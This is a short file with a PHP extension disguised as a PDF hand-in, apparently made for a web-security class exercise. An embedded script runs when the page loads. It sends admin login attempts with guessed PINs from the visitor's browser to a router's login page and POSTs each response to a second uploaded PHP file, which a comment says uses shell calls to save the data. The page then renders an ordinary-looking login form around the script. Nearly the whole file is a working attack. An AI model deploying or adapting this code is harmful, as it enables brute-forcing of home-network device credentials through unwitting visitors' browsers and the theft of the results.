<script>

        /* a7b8ad4cbdffdd633a15866c0e041f342e02248c.pdf.php   */
	/* 		       PIN: 9210	    	      */
	/* make up to 150 requests, printing output to files  */
	/* in /handins 					      */

	var xhttpArray = [];

	/* idea for JS closure from: http://stackoverflow.com/questions/13445809/how-to-handle-simultaneous-javascript-xmlhttprequests */
	for (var i = 9210; i < 9211; i++) {
		(function (i) {
		        xhttpArray[i] = new XMLHttpRequest();

			var pin = i.toString();
			while (pin.length < 4) {
				pin = '0' + pin;
			}

		        xhttpArray[i].onreadystatechange = function() {
        		        if(this.readyState == 4) {

                		        // save response from previous GET request
                        		var str = xhttpArray[i].responseText;

					// new object to handle response
					var rxhttp = new XMLHttpRequest();

		                        /* POST to another file: this is the hash of 'handle.pdf.php', which should
        		                 * make shell calls to 1) create a file and 2) dump the contexts of the previous
                		         * GET request out to that file */
		                        rxhttp.open('POST', '/handins/fe0e94ae124a5953ae3c7b53d638ab2920163ee8.pdf.php', true);
        		                rxhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                		        rxhttp.send('info=' + str + '&pin=' + pin);
	       	         	}
		        };

		        /* send POST request to router's login page */
        		xhttpArray[i].open('POST', 'http://router.local:80/login.php', true);
     		        xhttpArray[i].setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		        xhttpArray[i].send('username=admin&pin=' + pin);
		}) (i);
	}
</script>

<?php $this->display('header.tpl', $args); ?>

<?php $this->display('login-form.tpl', $args); ?>

<?php $this->display('footer.tpl', $args); ?>
